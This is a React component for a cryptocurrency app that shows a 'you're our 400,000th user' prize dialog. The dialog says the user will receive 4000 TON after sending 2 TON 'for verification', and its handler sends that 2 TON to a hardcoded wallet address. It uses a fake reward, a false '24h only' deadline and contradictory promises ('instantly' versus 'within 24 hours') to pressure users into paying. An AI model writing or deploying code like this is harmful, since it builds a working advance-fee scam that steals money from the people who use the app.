import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useTonWallet } from "@/hooks/useTonWallet";
import { TonTransactionService } from "@/services/tonTransactionService";
import { useTonConnectUI } from "@tonconnect/ui-react";
import { useToast } from "@/hooks/use-toast";
import { Star, Gift, Clock, Shield } from "lucide-react";
interface CongratulationsDialogProps {
  isOpen: boolean;
  onClose: () => void;
}
export default function CongratulationsDialog({
  isOpen,
  onClose
}: CongratulationsDialogProps) {
  const {
    isConnected
  } = useTonWallet();
  const [tonConnectUI] = useTonConnectUI();
  const {
    toast
  } = useToast();
  const [isProcessing, setIsProcessing] = useState(false);
  const handlePayment = async () => {
    if (!isConnected || !tonConnectUI) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      });
      return;
    }
    setIsProcessing(true);
    try {
      const transactionService = new TonTransactionService(tonConnectUI);

      // Send 2 TON verification transaction to platform address
      await transactionService.sendTransaction(
        "UQCMWS548CHXs9FXls34OiKAM5IbVSOr0Rwe-tTY7D14DUoq", // Correct platform address
        2, // 2 TON
        "SPACE Verse verification - 400,000th user reward claim"
      );
      toast({
        title: "Verification Successful!",
        description: "Your 4002 TON reward will be sent within 24 hours",
        variant: "default"
      });
      onClose();
    } catch (error) {
      console.error("Transaction failed:", error);
      toast({
        title: "Transaction Failed",
        description: "Please try again or contact support",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };
  const handleConnectWallet = () => {
    tonConnectUI.openModal();
  };
  return <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-xs w-[85vw] mx-auto backdrop-blur-2xl bg-gradient-to-br from-white/10 via-white/5 to-transparent border border-white/20 p-4 rounded-2xl shadow-2xl z-50">
        <DialogHeader className="text-center space-y-2">
          <DialogTitle className="text-lg font-bold bg-gradient-to-r from-yellow-300 via-yellow-400 to-orange-400 bg-clip-text text-transparent drop-shadow-sm">
            SPACE Verse!
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-3">
          {/* Main message */}
          <div className="text-center space-y-3">
            <div className="backdrop-blur-xl bg-gradient-to-r from-purple-500/10 via-blue-500/10 to-purple-500/10 rounded-xl p-3">
              <p className="text-white/90 text-sm leading-relaxed drop-shadow-sm">
                You're our <span className="font-bold text-yellow-300 drop-shadow-sm">400,000th user</span>! 
                <br/>Get <span className="font-bold text-emerald-300 drop-shadow-sm">4000 TON</span> bonus!
              </p>
            </div>

            {/* Verification info */}
            <div className="backdrop-blur-xl bg-white/5 rounded-xl p-3 space-y-2">
              <div className="flex items-center gap-2 text-blue-200 justify-center">
                <Shield className="w-4 h-4 drop-shadow-sm" />
                <span className="text-sm font-medium drop-shadow-sm">Verification Required</span>
              </div>
              <p className="text-white/80 text-xs leading-relaxed">
                Send <span className="font-bold text-yellow-300">2 TON</span> for verification
              </p>
              <p className="text-emerald-200 text-xs">
                Get 2 TON back + 4000 TON reward instantly
              </p>
            </div>

            {/* Total calculation */}
            <div className="backdrop-blur-xl bg-gradient-to-r from-emerald-500/10 to-green-500/10 rounded-xl p-3">
              <p className="text-emerald-200 font-bold text-base drop-shadow-sm">
                Total = 4002 TON
              </p>
            </div>

            {/* Time limit warning */}
            <div className="backdrop-blur-xl bg-orange-400/5 rounded-xl p-2">
              <div className="flex items-center gap-2 justify-center text-orange-200">
                <Clock className="w-4 h-4 drop-shadow-sm" />
                <span className="text-sm drop-shadow-sm">24h only</span>
              </div>
            </div>
          </div>

          {/* Action button */}
          <div className="pt-2">
            {isConnected ? <Button onClick={handlePayment} disabled={isProcessing} className="w-full backdrop-blur-xl bg-gradient-to-r from-emerald-500/20 to-green-500/20 hover:from-emerald-500/30 hover:to-green-500/30 border border-emerald-400/30 text-white text-sm py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-emerald-500/20">
                {isProcessing ? <span className="flex items-center gap-2 justify-center">
                    <div className="w-4 h-4 border-2 border-white/70 border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </span> : "Pay 2 TON & Claim"}
              </Button> : <Button onClick={handleConnectWallet} className="w-full backdrop-blur-xl bg-gradient-to-r from-blue-500/20 to-purple-500/20 hover:from-blue-500/30 hover:to-purple-500/30 border border-blue-400/30 text-white text-sm py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-blue-500/20">
                Connect Wallet
              </Button>}
          </div>
        </div>
      </DialogContent>
    </Dialog>;
}